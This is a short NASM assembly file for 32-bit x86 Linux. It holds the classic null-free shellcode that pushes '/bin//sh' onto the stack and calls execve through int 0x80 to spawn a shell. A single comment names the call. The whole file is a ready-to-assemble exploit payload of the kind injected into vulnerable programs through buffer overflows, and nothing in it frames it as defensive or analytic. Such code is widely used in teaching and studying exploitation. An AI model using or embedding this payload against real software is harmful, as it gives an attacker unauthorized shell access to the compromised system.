BITS 32

; execve("/bin//sh", ["/bin//sh", NULL], [NULL])

xor eax, eax
xor ebx, ebx
xor ecx, ecx
cdq

push BYTE 11
pop eax

push ecx
push 0x68732f2f
push 0x6e69622f

mov ebx, esp

push ecx
mov edx, esp

push ebx
mov ecx, esp

int 0x80
